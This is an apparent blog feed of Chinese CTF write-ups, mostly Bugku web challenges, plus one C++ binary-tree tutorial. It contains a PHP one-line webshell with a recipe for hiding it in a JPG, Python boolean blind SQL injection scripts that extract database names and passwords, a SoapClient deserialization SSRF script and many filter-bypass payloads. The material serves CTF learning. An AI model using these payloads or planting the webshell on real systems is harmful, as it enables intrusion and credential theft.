    <content type="text"><![CDATA[bugku的SQL注入2另一种做法是利用了文件泄露漏洞做的，在这里总结一下遇到的各种文件泄露漏洞 DS_Store从网上搜到有关讲解： DS_Store 是 Mac 下 Finder 用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。 删除以后的副作用就是这些信息的失去。(当然，这点副作用其实不是太大) 和别人交换文件（或你做的网页需要上传的时候）应该把 .DS_Store 文件删除比较妥当， 因为里面包含了一些你不一定希望别人看见的信息（尤其是网站，通过 .DS_Store 可以 知道这个目录里面所有文件的清单，很多时候这是一个不希望出现的问题）。做SQL注入2这道题，下载了ds_store_exp-master这个工具扫描一下，发现真的有这个漏洞 Git当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 而在发布代码的时候，如果没有把 .git 这个目录删除，直接发布到了运行目录中。攻击者就可以通过这个文件夹，可以用来恢复源代码。 可以使用GitHack这个工具利用这个漏洞 例如，在文件夹下git init，之后git add，此时.git目录就存储了这个文件的数据 swp在linux下使用vi编辑文件时会产生一个备份文件，保存后则会自动删除这个备份文件； 若在编辑时意外退出，则会产生一个永久的备份文件，可以使用 .文件名.swp来访问这个备份文件 可以使用 vi -r 来查看当前目录下所有的隐藏的swp文件 可以使用 vi -r .文件名.swp来恢复文件 再次意外退出时，不会覆盖旧的交换文件，而是会重新生成新的交换文件；如，第一次意外退出产生.abc.txt.swp，再次意外退出产生.abc.txt.swo,第三次意外退出产生.abc.txt.swn，以此类推 待更…]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[中国菜刀与一句话木马]]></title>
    <url>%2F2018%2F11%2F27%2F%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[中国菜刀是一款专业的网站管理软件 PHP一句话木马： &lt;? @eval($_POST[&apos;pass&apos;]);&gt;图片一句话木马制作 1.新建一个文件夹2.文件夹放三个文件，1.jpg，1.php，1.bat3.在1.php中写入一句话木马；在1.bat写入cmd4.点击1.bat，写入 copy 1.jpg/b+1.php new.jpg生成的new.jpg即为图片一句话木马]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku过滤注入题目分析]]></title>
    <url>%2F2018%2F11%2F26%2FBugku%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[一道是login3这道题，一道是sql2的题，题目很像，就放一块写wp吧 思路这两题很像，都有三个相似点： 1.使用了过滤的字符会提示不合法字符 2.用户名错误会显示用户名错误或不存在 3.用户名正确会显示密码错误(不知道密码)解题思路： 1.尝试字符是否合法，得出那些字符被过滤了 2.在username的框中进行注入；根据页面显示 用户名错误还是显示密码错误进行布尔盲注做这两题也都有猜测成分，因为information不能用，则猜测表中应该只有一条数据，字段名为用户名和密码，登录时只有用户名和密码都正确才能进入(当然用户名绕过时只需密码正确即可)；猜测密码的字段名时，查看了网页源代码，找到密码输入框的name，当做密码字段名，尝试发现成功了。 sql2：过滤： 空格 or for information || and # -- union ,由于注释被过滤了，那就尝试使用单引号进行闭合(发现成功，说明为单引号注入) 构造 1&apos;^&apos;1&apos;=&apos;1由于SQL比较时会进行数据类型转换，则如果 select ... where username=0;会查询成功，那么此时会显示密码错误 则更改 1&apos;^xxx=&apos;1即可进行注入，这里xxx为payload login3被过滤： and like 空格 = , for information union则构造 1&apos;or(1&lt;&gt;2)#可绕过用户名，显示密码错误 此时运用 1&apos;or(xxx&lt;&gt;2)#即可进行盲注，这里xxx为payload 脚本sql2import requests name = &apos;&apos; url = &apos;http://123.206.87.240:8007/web2/login.php&apos; for position in range(1, 4): for num in range(32, 127): data = {&apos;uname&apos;: &quot;1&apos;^(ascii(substr(database()from(%d)))=%d)=&apos;1&quot; % (position, num), &apos;passwd&apos;: &apos;asdf&apos;} req = requests.post(url, data) if &apos;password error&apos; in req.text: name += chr(num) break print(name) print(&apos;over&apos;) for i in range(50): data = {&apos;uname&apos;: &quot;1&apos;^(length(passwd)=%d)=&apos;1&quot; % (i), &apos;passwd&apos;: &apos;asdf&apos;} req = requests.post(url, data) if &apos;password error&apos; in req.text: print(i) break print(&apos;over&apos;) passwd = &apos;&apos; for position in range(1, 33): for num in range(32, 127): data = {&apos;uname&apos;: &quot;1&apos;^(ascii(substr((passwd)from(%d)))=%d)=&apos;1&quot; % (position, num), &apos;passwd&apos;: &apos;asdf&apos;} req = requests.post(url, data) if &apos;password error&apos; in req.text: passwd += chr(num) print(passwd) break print(passwd) print(&apos;over&apos;)login3import requests url = &apos;http://123.206.31.85:49167/index.php&apos; for num in range(1,20): data = {&apos;username&apos;:&quot;1&apos;or(length(database())&lt;&gt;%d)#&quot;%num,&apos;password&apos;:&apos;asdf&apos;} req = requests.post(url,data) if &apos;exist&apos; in req.text: print(num) break print(&apos;over&apos;) name = &apos;&apos; for position in range(1,9): for i in range(32,127): data = {&apos;username&apos;:&quot;1&apos;or(ascii(substr(database()from(%d)))&lt;&gt;%d)#&quot;%(position,i),&apos;password&apos;:&apos;asdf&apos;} req = requests.post(url,data) if &apos;exist&apos; in req.text: name += chr(i) print(chr(i),end=&apos;&apos;) break print(&apos;\nover&apos;) for i in range(1,50): data = {&apos;username&apos;:&quot;1&apos;or(length(password)&lt;&gt;%d)#&quot;%i,&apos;password&apos;:&apos;asdf&apos;} req = requests.post(url,data) if &apos;exist&apos; in req.text: print(i) break print(&apos;over&apos;) password = &apos;&apos; for position in range(1,33): for i in range(32,127): data = {&apos;username&apos;:&quot;1&apos;or(ascii(substr((password)from(%d)))&lt;&gt;%d)#&quot;%(position,i),&apos;password&apos;:&apos;asdf&apos;} req = requests.post(url,data) if &apos;exist&apos; in req.text: password += chr(i) print(chr(i),end=&apos;&apos;) break print(&apos;\nover&apos;)]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL注入过滤]]></title>
    <url>%2F2018%2F11%2F23%2FSQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%2F</url>
    <content type="text"><![CDATA[最近做SQL注入的题碰到注入时过滤了一些字符、关键字的情况，总结一下 检测是否被过滤检测字符是否被过滤，或使用 1’or 1=1# 登录绕过时，可使用的： and # 可用&amp;&amp;代替；get注入时需url编码为%26%26 or # 可用||代替 ^ # 二进制异或运算;二者相同为0，不同为1 | # 二进制或运算；二者都为0为0，否则为1 &amp; # 二进制与运算；二者都为1为1，否则为0;get注入时需url编码为%26使用常用绕过双写绕过若只是简单的过滤一次，则可用双写的方法 例，过滤了’or’ sth.replace(&apos;or&apos;,&apos;&apos;)则双写为’oorr’ 注：此时’information’、’for’…中也含有’or’，也需要双写！ 大小写绕过进行简单的字符串比较时可用大小写混用的方法 例，检测语句中是否有’union select’字符串，可以写成 UnIon SeLecT 1,2;一些关键字符(串)的替换1.字符串截取函数：常用的截取函数： substr(字符串，开始位置，长度) mid(字符串，开始位置，长度) substring(字符串，开始位置，长度) #位置从1开始；php中的substr位置从0开始作用相同 另：除了(字符串，开始位置，长度)这种形式的截取方式以外，还有 (字符串 from num1 for num2) 截取字符串从位置num1开始，截取长度为num2 (字符串 from num ) num&gt;0时，截取字符串从位置num到最后；num&lt;0时，截取字符串从最后一位开始截取num位其他的截取函数： left(s,n) 返回字符串s的前n个字符 right(s,n) 返回字符串s的后n个字符2.空格可用()(括号中间不能为关键字)、注释符/**/、%0a代替，例： select(users)from(information); select/**/users/**/from/**/information; http://127.0.0.1/labs/Less-1/?id=1%0aand%0a1=13.比较符不等于符： !=可用&lt;&gt;代替等于符： like #模糊匹配符 if(length(database())like(3),1,0) regexp #正则匹配符 if(length(database())regexp(3),1,0)IN 操作符允许我们在 WHERE 子句中规定多个值： SELECT column_name(s) FROM table_name WHERE column_name IN (value1,value2,...)另： greatest() 返回最大值 least() 返回最小值4.ascii码ascii与ord等价;都是返回字符串首位的ascii值 char() 返回数值对应的ascii (python中chr()返回数值对应的ascii)若ascii、ord等求ascii的函数被过滤了，可以根据原字符匹配(费时间)，也可进行模糊匹配(若一位一位的匹配，无法确定字符的重复性、顺序性) #使用ascii进行模糊匹配 select if(database()regexp(char(116)),1,0);还可使用16进制比较的方式；使用16进制时，要在数前加上 0x hex() 求16进制 #使用hex进行模糊匹配 if(database()regexp(0x99),1,0); 另： strcmp(str1, str2) 比较两个字符串(16进制)；如果这两个字符串(16进制)相等返回0， 若str1的16进制大于str2的16进制则返回1，否则返回0注：ascii与16进制均不能表示变量，只能表示字符(串) 比如，有这样一个SQL语句： select * from users where username=&apos;cat&apos;;‘cat’可以分别用ascii和hex表示： select * from users where username=char(99,97,116); select * from users where username=0x636174;如果引号或表的某条内容，例如用户名为admin，‘admin’被过滤了，就可以用ascii或16进制的方式 5.逗号1. select 1,2; select * from (select 1)a join (select 2)b; #等价2. limit a,b limit b offset a #等价；位置a从0开始，b为长度6.注释符若 # -- (空格)被过滤了，可让查询/运算的最后一个数据为字符 1&apos;union select &apos;2 select username from users where id=&apos; 1&apos;union select &apos;2 &apos;; 1&apos;^1=&apos;1 select username from users where id=&apos; 1&apos;^1=&apos;1 &apos;;注：SQL运算时会进行类型转换 select username from users where id=&apos;1&apos;; select username from users where id=1; #等价 select password from users where username=&apos;1&apos;^1=&apos;1&apos;; select password from users where username=&apos;1&apos;-1-&apos;&apos;; select password from users where username=0; #等价,会报出所有username首字母不为数字的数据7.ifif(exp,a,b) #表达式exp正确则返回a,否则返回b等价于 case when 1 then a when 2 then b else c end #如果为1则返回a，如果为2返回b，否则返回c(可省略then a when 2)8.sleep在盲注时一般会用到sleep函数，可以用benchmark这个函数替换 mysql&gt; select benchmark(1000000,encode(1,2)); +--------------------------------+ | benchmark(1000000,encode(1,2)) | +--------------------------------+ | 0 | +--------------------------------+ 1 row in set (5.45 sec)即将encode这个函数执行1000000次，因此会花费一些时间，与sleep效果相同 9.information_schema.tables/columns小数点的前后加空格也可以正常使用： mysql&gt; select 1 from users where id=-1 union select group_concat(table_name) from information_schema . tables where table_schema=database(); +-------------------------+ | 1 | +-------------------------+ | biu,users,users1,users2 | +-------------------------+ 1 row in set (0.00 sec)在注入时有时需这样绕过： union%20select%201,2,group_concat(table_name)%20from%20information_schema%0a.%0atables%20where%20table_schema=database()%23其执行的语句为： union select 1,2,group_concat(table_name) from information_schema . tables where table_schema=database()#报错注入一般的注入方法双查询注入 updatexml(目标xml文档，xml路径，更新的内容) extractvalue(目标xml文档，xml路径) 若将information等关键字过滤了：使用了SQL中不存在的函数会报错出于当前数据库的信息 获取当前数据库： 1&apos; and asdf()%23 获取当前数据表 Polygon(id) linestring(id)获取当前表中字段 join子句： 把来自两个或多个表的行结合起来 on指定连接条件；using指定需要哪些列相等(字段名合并)例： a join b若a有2行数据，b有3行数据，join后有6行数据 又a中有字段id，值为1,3；b有字段id，值为1,2,3， 可指定 a join b on(a.id=b.id) #返回的表有两行，有两个id字段，值都为1,3 也可指定 a join b using(id) #返回的表有两行，有一个id字段，值为1,3在使用别名的时候，表中不能出现相同的字段名，否则就会报错 select * from users where id=1 and (select * from (select * from users as a join users as b)as c); #可得到第一个字段名 #若第一个字段名为id，则 select * from users where id=1 and (select * from (select * from users as a join users as b using(id))as c); #可得到第二个字段名 #若第二个字段名为username select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username)as c); 可得到第三个字段名 ...使用order by进行盲注过滤字段名获取数据 order by num #逐位比较字符串的16进制的大小，默认从小到大的顺序若有表： mysql&gt; select * from users1; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | admin | asdf | +----+----------+----------+若要获取admin的密码，但不知道字段名 mysql&gt; select * from users1 union select 1,2,0x61 order by 3; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | 2 | a | | 1 | admin | asdf | +----+----------+----------+0x61为字符a的16进制 mysql&gt; select * from users1 union select 1,2,0x62 order by 3; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | admin | asdf | | 1 | 2 | b | +----+----------+----------+当联合查询部分有0x61时，显示2，当联合查询部分有0x62时，显示admin，则说明0x61对应的字符即为密码的首位，则可写盲注脚本… 使用between进行盲注当前数据库名为： mysql&gt; select database(); +------------+ | database() | +------------+ | test1 | +------------+ 1 row in set (0.00 sec)使用between and语句进行查询： mysql&gt; select database() between &apos;s&apos; and &apos;u&apos;; +--------------------------------+ | database() between &apos;s&apos; and &apos;u&apos; | +--------------------------------+ | 1 | +--------------------------------+ 1 row in set (0.00 sec)由于首字母t位于s和u之间，则会返回1，否则返回0： mysql&gt; select database() between &apos;s&apos; and &apos;t&apos;; +--------------------------------+ | database() between &apos;s&apos; and &apos;t&apos; | +--------------------------------+ | 0 | +--------------------------------+ 1 row in set (0.00 sec)between A and B的范围为：大于等于A，小于B，如下面的查询也会返回1： mysql&gt; select database() between &apos;t&apos; and &apos;u&apos;; +--------------------------------+ | database() between &apos;t&apos; and &apos;u&apos; | +--------------------------------+ | 1 | +--------------------------------+ 1 row in set (0.00 sec)当然，以上字母都可以用16进制代替 参考 https://www.secpulse.com/archives/68991.html https://www.cnblogs.com/Vinson404/p/7253255.html http://shaobaobaoer.cn/archives/701/anheng-11yue-wp-unfinish#BETWEEN]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-flag.php]]></title>
    <url>%2F2018%2F11%2F22%2FBugku-flag-php%2F</url>
    <content type="text"><![CDATA[题目： 进去之后果然点不动按钮 查看源代码 发现按钮的设置 type=&apos;button&apos;找到了input type的属性值 button 定义可点击按钮（多数情况下，用于通过JavaScript启动脚本）。 checkbox 定义复选框。 file 定义输入字段和 &quot;浏览&quot;按钮，供文件上传。 hidden 定义隐藏的输入字段。 image 定义图像形式的提交按钮。 password 定义密码字段。该字段中的字符被掩码。 radio 定义单选按钮。 reset 定义重置按钮。重置按钮会清除表单中的所有数据。 submit 定义提交按钮。提交按钮会把表单数据发送到服务器。 text 定义单行的输入字段，用户可在其中输入文本。默认宽度为20个字符。因此是点不动滴！ 然后提示是hint，提示的英语单词本来就是hint啊，上网搜才明白原来得传入hint参数 有两个注意点： 1.由于使用的是if和elseif，则传入cookie参数的时候要回到上一级flagphp文件中 2.elseif的括号包含&lt;?php，因此变量$KEY并没有被设置写PHP脚本 &lt;?php echo serialize(&quot;$KEY&quot;) ?&gt; 用burp]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-细心]]></title>
    <url>%2F2018%2F11%2F22%2FBugku-%E7%BB%86%E5%BF%83%2F</url>
    <content type="text"><![CDATA[题目： 进到了这样一个页面，然而没什么发现 后来上网上搜了一下才知道去robots.txt看看 进到resusl.php 传入参数x=admin即可]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[哈勃杯-bestphp's revenge]]></title>
    <url>%2F2018%2F11%2F20%2F%E5%93%88%E5%8B%83%E6%9D%AF-bestphp-s-revenge%2F</url>
    <content type="text"><![CDATA[题目： &lt;?php highlight_file(__FILE__); $b = &apos;implode&apos;; call_user_func($_GET[f],$_POST); session_start(); if(isset($_GET[name])){ $_SESSION[name] = $_GET[name]; } var_dump($_SESSION); $a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;); call_user_func($b,$a); ?&gt;相关函数： 1.implode(): 把数组元素组合为字符串 2.call_user_func(): 把第一个参数作为回调函数调用 第一个参数是被调用的回调函数，其余参数是回调函数的参数。 函数可以是自己定义的(已定义)，也可以是系统自带函数 3.session_start(): 启动新会话或者重用现有会话 此函数参数是一个关联数组，如果提供，那么会用其中的项目覆盖会话配置指示中的配置项。 4.$_SESSION为全局变量，$_SESSION[name]为注册一个会话变量 5.reset() 函数将内部指针指向数组中的第一个元素，并输出有关SESSION： http://www.w3school.com.cn/php/php_sessions.asp分析：要传入三个值： 要用get方法传入参数f，且f的值为函数； $_POST函数接收post传进来的值；如post传进来b=123，则为$_POST为[&apos;b&apos;=&gt;123] 用get方法传入参数name由于b=implode，则最后一句call_user_func($b,$a)为将数组a组合为字符串，并没有用 开始想的是，可以使用变量覆盖的方法，利用call_user_func($_GET[f],$_POST)，由于$_POST为数组，则让$_GET[f]的值为extract，即可实现变量覆盖，但还是不知道要让b为什么函数 纳尼！！看了别人的wp，发现原来还有flag.php这个文件！！！ 看了别人的wp，发现好多东西没学到 https://xz.aliyun.com/t/3355发现一篇大佬的博客： https://blog.spoock.com/2016/10/16/php-serialize-problem/脚本 import requests import re url = &quot;http://172.81.210.82/&quot; payload = &apos;|O:10:&quot;SoapClient&quot;:3: {s:3:&quot;uri&quot;;s:3:&quot;123&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/ flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;}&apos; r = requests.session() data = {&apos;serialize_handler&apos; : &apos;php_serialize&apos;} url1 = url+&quot;?f=session_start&amp;name=&quot;+payload html = r.post(url1, data=data).text #设置session默认序列化引擎为php_serialize，即直接将payload序列化后进行存储 data = {&apos;b&apos; : &quot;call_user_func&quot;} url2 = url+&quot;?f=extract&amp;name=&quot;+payload html = r.post(url2, data=data).text #设置b为call_user_func函数 data = {&apos;b&apos; : &quot;var_dump&quot;} url2 = url+&quot;?f=extract&amp;name=&quot;+payload html = r.post(url2, data=data).text #设置b为var_dump函数 rs = re.findall(r&apos;string\(26\) &quot;(.*?)&quot;&apos;, html) url2 = url cookie = {&quot;Cookie&quot;:&quot;PHPSESSID=&quot;+rs[0]} html = r.post(url2,headers = cookie).text print html。。。对XML、SOAP了解太少，还是去补补计网吧]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-多次]]></title>
    <url>%2F2018%2F11%2F15%2F%E5%A4%9A%E6%AC%A1%2F</url>
    <content type="text"><![CDATA[题目： 很明显，可能有sql注入漏洞，构造 id=1&apos; 在后面加上注释： id=1&apos;%23页面又恢复正常了，说明存在单字符注入 获取主查询列数： 0&apos;order by 1%23发现页面又错了，再构造 1&apos;or 1=1%23还是错的，难道过滤了某些字符？ 这时就用到了异或^这个运算符：两边数值相等返回0，不等时根据其数值对应的二进制进行每位对应运算并返回运算后的十进制结果 构造 1&apos;^(length(&apos;order&apos;)=5)%23如果没有过滤’order’，则length(‘order’)=5会返回1,1^1为0，即表达式为 ?id=0id=0会返回错误页面，但测试后. 仍是id=1的页面，说明length(‘order’)=5返回的为0，即order被过滤了，那么此时length(‘order’)=0对吧？ 1&apos;^(length(&apos;order&apos;)=0)%23如果order被完全过滤，则上面构造的运算为1^1，返回0 但！试了后发现页面仍是正确的，说明’order’并没有完全被过滤 想起了上面使用’or’也不起作用，测试了一下’or’ 1&apos;^(length(&apos;or&apos;)=2)%23页面是正确的，说明’or’被过滤了，因为’order’中有’or’，这就解释的通了 继续测试： 1&apos;^(length(&apos;union&apos;)=5)%23 //页面返回正常，说明union被过滤 1&apos;^(length(&apos;select&apos;)=6)%23 //页面返回正常，说明select被过滤则双写绕过 1&apos;oorrder by 1%23 //到3报错，说明有两列 0&apos;uniounionn selecselectt 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23 //这样获取不了表名，后来发现&apos;information&apos;中也含有&apos;or&apos; 。。。 改正后： 0&apos;uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23 flag1表中的信息： flag1 address usOwycTju+FTUUzXosjr http://123.206.87.240:9004/Once_More.php?id=1hint中没啥信息。 进入新网址 撸啊撸？这图真阔爱 又有注入，发现仍是单字符注入，而且还是报错型的 使用order by，发现这次没有过滤，得到主查询有两个查询字段 进行联合查询，发现union被过滤了 进行union双写，结果发现这回不只是union了，连select都没了。。。 估计后端代码在过滤完后检测，如果有’union select’，就替换为空。 有两种注入思路： 1.报错注入 1&apos;and updatexml(1,concat(&quot;~&quot;,(select database())),1)%23 //1&apos;and extractvalue(1,concat(&quot;~&quot;,(select database())))%232.盲注 用盲注的方式注入，根据页面是否出现Hello…来判断 不过用之前的脚本，发现只跑出了数据库名长度，却跑不出库名，后来发现原来substr这个函数被过滤了，不过mid这个函数没有被过滤(mid使用方法与substr一样)，于是将substr替换为mid]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[二叉树]]></title>
    <url>%2F2018%2F11%2F14%2F%E4%BA%8C%E5%8F%89%E6%A0%91%2F</url>
    <content type="text"><![CDATA[二叉树数的节点结构: struct BiNode { char data; BiNode *lchild, *rchild; };先序创建二叉树在创建二叉树时，用先序的方式递归创建；并且要有终止条件，当节点无左右子树则不继续创建 如输入 ab##c##，实际创建的为： 代码实现创建： void Create(BiNode* &amp;T) { char str; cout &lt;&lt; &quot;请输入一个字母作为树的值： &quot;; cin &gt;&gt; str; if (str == &apos;#&apos;) //若输入#，代表创建空树 { T = NULL; } else { T = new BiNode; T-&gt;data = str; //递归创建左右孩子 Create(T-&gt;lchild); Create(T-&gt;rchild); } }四种遍历二叉树的方法四种方法：先序遍历、中序遍历、后序遍历、层序遍历，其中先序遍历、中序遍历、后序遍历只需调换输出语句和遍历语句的次序即可 先序遍历先访问根节点，再依次访问左孩子、右孩子 void PreTravers(BiNode* &amp;T) { if (T) { cout &lt;&lt; T-&gt;data &lt;&lt; &quot; &quot;; PreTravers(T-&gt;lchild); PreTravers(T-&gt;rchild); } }中序遍历先访问左孩子，再依次访问根节点、右孩子 void MidTravers(BiNode* &amp;T) { if (T) { MidTravers(T-&gt;lchild); cout &lt;&lt; T-&gt;data &lt;&lt; &quot; &quot;; MidTravers(T-&gt;rchild); } }后序遍历先访问左孩子，再依次访问右孩子、根节点 void FinTravers(BiNode* &amp;T) { if (T) { FinTravers(T-&gt;lchild); FinTravers(T-&gt;rchild); cout &lt;&lt; T-&gt;data &lt;&lt; &quot; &quot;; } }层序遍历利用队列，从上到下，从左到右进行先进先出 根节点入队列，之后进行循环（若节点不为空）：输出队首元素的值，再依次访问其左、右孩子，若存在并将其入队列，再将队首节点出队 int FloTravers(BiNode *T) { if (!T) //若根节点为空，结束并返回0 { return 0; } BiNode *temp; //定义temp指针保存当前队列的首部地址 queue&lt;BiNode*&gt;Q; //定义模板类:队列Q Q.push(T); //树根节点入队 while (!Q.empty()) //若队列不为空则循环执行并输出 { temp = Q.front(); //队首地址赋值给temp并输出数据 cout &lt;&lt; temp-&gt;data; if (temp-&gt;lchild) //如果当前节点存在左孩子，则将左孩子入队 { Q.push(temp-&gt;lchild); } if (temp-&gt;rchild) //如果当前节点存在右孩子，则将右孩子入队 { Q.push(temp-&gt;rchild); } Q.pop(); //删除队首元素 } }其中：queue模板类需要两个模板参数，一个是元素类型，一个容器类型，元素类型是必要的，容器类型是可选的，默认为deque类型。 需要加上头文件 #include&lt;queue&gt;定义queue对象的示例代码如下： queue&lt;int&gt; q1; queue&lt;double&gt; q2;队列模板类使用方法： 1.size() 返回队列中元素的个数 2.empty() 如果队列空则返回真 3.back() 返回最后一个元素引用即队尾。 4.front() 返回第一个元素引用即队首。 5.pop() 删除第一个元素，即队首元素。不返回 6.push() 在末尾加入一个元素，即放置在队尾 。不返回]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-login1(SKCTF)]]></title>
    <url>%2F2018%2F11%2F09%2FBugku-login1-SKCTF%2F</url>
    <content type="text"><![CDATA[提示说sql约束攻击，搜了下相关知识 数据库的username字段(或其他字段)如果没有设置为UNIQUE约束，说明字段值可以不唯一 建表时，每个字段都会定义一个长度，例如char(20)；注册时，执行INSERT语句超过这个长度的部分会被截断；但是在SELECT查询时将使用完整的字符串进行搜索，所以注册用户名为 admin a不会查找到匹配的结果，也就绕过了检查用户名是否存在的查询，即可成功注册 注册账号为’admin ‘，admin后面有三个空格，可注册成功(字段长度可能为5，超过被截断 后来实验发现一个空格就可以) 登录即可得到flag 执行过程为： 1.查询表中是否有&apos;admin &apos;(后面有三个空格) 2.没有，则进行插入&apos;admin&apos;(截断后) 3.以&apos;admin&apos;、自己设定的用户名密码进行登录，即可作为admin进入参考 https://blog.csdn.net/wy_97/article/details/77972375#commentBox https://www.freebuf.com/column/179817.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[安恒杯十月月赛wp]]></title>
    <url>%2F2018%2F11%2F09%2F%E5%AE%89%E6%81%92%E6%9D%AF%E5%8D%81%E6%9C%88%E6%9C%88%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[题很难，不过稳住 easy audit即容易的审计（一点都不容易） 每次刷新上面的数字都不一样，查看源代码 发现有’index.php?func1’，还发现有’flag.php’ 进入到flag.php，发现只有一组随机数 进入到index.php?func1，还是原始页面，设置参数 index.php?func1=phpinfo 发现有回显，说明可以执行参数func1后的函数值，下面用到了 get_defined_functions() 获取所有已经定义的函数 get_defined_vars() 这个函数是返回由所有已定义变量所组成的数组 参考 https://www.jb51.net/article/42890.htm构造 /index.php?func1=get_defined_functions 在数组最后发现 jam_source_ctf_flag 这个函数 构造 /index.php?func1=jam_source_ctf_flag进入到这个函数 很乱，查看源代码，发现隐藏了一些代码 即当前页面的代码就是flag.php中的代码。 代码意思为：定义了一个类，里面有属性$a，魔法方法__construct自动获取传入的参数a的值并赋值给$a;方法gen_str返回变量$str，$str是一个随机的数字字符串；方法GiveYouTheFlag会包含’real_flag.php’，如果$secret（即$str)与$a相同则输出flag 但$str是随机的，无法通过设置参数a来进行匹配，不过下面还有代码 如果post提交了flag参数且值为’I want the flag’，就会将’real_flag.php’包含 这时，再构造 index.php?func1=get_defined_vars获得所有变量，即可得到flag Ordinary keybord李磊是一名程序员，在他的笔记本里有一些这样的记录： QQ:iloveyou521 blog:blog132 wechat:wechat190 看着应该像是密码，于是尝试去登录，发现密码错误 后来一打听，原来他将这些密码经过自己写的一个简单的加密算法变成真实的密码，而自己笔记本中存放的只是一些虚假的密码，只是方便记忆而已 其真实密码如下： QQ:+p)g$_)&apos;521 blog:hp)u132 wechat:A$ezr&amp;190 hint:Caesar flag is spru.r5sf3h7660h7394e169699hffe0s0h$4, Please restore the real flag分析： 根据加密后的flag，spru对应的应该为flag s - f p - l r - a u - g . - { , - }根据已知记录 + - i p - l ) - o g - v $ - e _ - y ) - o &apos; - u h - b p - l ) - o u - g A - w $ - e e - c z - h r - a &amp; - t加密时数字不进行加密 则根据加密后的密文，可以得知的解密为： flag{a5f?3b7660b7394c169699b??c0f0be4}根据对应关系，可以得出没有对应关系的字母为： d j k m n p q r s x z依次尝试发现？为d flag{a5fd3b7660b7394c169699bddc0f0be4}下回做题一定要记得多尝试。。。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-过狗一句话]]></title>
    <url>%2F2018%2F11%2F08%2FBugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%2F</url>
    <content type="text"><![CDATA[题目 函数： explode(): 把字符串打散为数组 参数 separator 必需。规定在哪里分割字符串。 string 必需。要分割的字符串。 limit 可选。规定所返回的数组元素的数目。则$poc_2为assert() 函数： assert(): 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。 print_r(): print_r ( mixed $expression [, bool $return ] ) 参数说明： $expression: 要打印的变量，如果给出的是 string、integer 或 float 类型变量，将打印变量值本身。 如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。 $return: 可选，如果为 true 则不输出结果，而是将结果赋值给一个变量，false 则直接输出结果。 scandir() 函数返回指定目录中的文件和目录的数组。assert函数会执行PHP语句，则传入 s=print_r(scandir(&apos;./&apos;))获取当前目录下的文件： 发现有f14g.txt这个文件，则进行获取： s=print_r(file_get_contents(&apos;f14g.txt&apos;)) or s=show_source(&apos;f14g.txt&apos;) s=highlight_file(&apos;f14g.txt&apos;)or 123.206.87.240:8010/f14g.txt]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-cookies欺骗]]></title>
    <url>%2F2018%2F11%2F08%2FBugku-cookies%E6%AC%BA%E9%AA%97%2F</url>
    <content type="text"><![CDATA[看题目上的字母一脸懵逼。。 不过在url上发现filename后的值为base64加密，进行解码 将index.php替换为keys.txt 发现内容与刚才的页面一样 则尝试获取index.php中的内容，让filename的值为‘index.php’经base64加密后的值 发现页面空白，则注意到了line这个参数，更改其值 出现了PHP代码，则写脚本获取所有代码 import requests for i in range(1,100): url = &apos;http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw&apos; % i req = requests.get(url).text print(req)得到了所有代码： error_reporting(0); $file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;keys.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;){ $file_list[2]=&apos;keys.php&apos;; } if(in_array($file, $file_list)){ $fa = file($file); echo $fa[$line]; } ?&gt;函数 in_array() 函数搜索数组中是否存在指定的值。 file() 函数把整个文件读入一个数组中。意思为，要在cookie中设置参数margin，其值为margin，这样file_list就会存在’keys.php’，之后如果变量file在file_list中，就会读取file的内容并按行输出 则将keys.php加密，且设置cookie就可以了]]></content>
      <categories>
        <category>web</category>
